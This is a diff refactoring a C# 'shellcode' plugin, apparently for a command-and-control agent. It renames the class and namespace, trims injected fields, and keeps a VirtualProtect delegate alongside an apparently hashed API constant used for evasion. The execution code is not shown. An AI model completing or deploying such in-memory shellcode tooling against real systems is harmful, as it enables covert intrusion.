@@ -7,9 +7,9 @@ using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 
-namespace shellcode
+namespace Agent
 {
-    public class ShellcodeExec : IPlugin
+    public class Plugin : IPlugin
     {
         public string Name => "shellcode";
         private delegate void BufferDelegate();
@@ -29,17 +29,13 @@ namespace shellcode
         }
         const long VirtPro = 65467780416196;
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        public IAgentConfig config { get; set; }
-        public IMessageManager messageManager { get; set; }
-        public ILogger logger { get; set; }
-        public ITokenManager tokenManager { get; set; }
+        private delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private IMessageManager messageManager { get; set; }
+        private ITokenManager tokenManager { get; set; }
 
-        public ShellcodeExec(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
         {
             this.messageManager = messageManager;
-            this.config = config;
-            this.logger = logger;
             this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
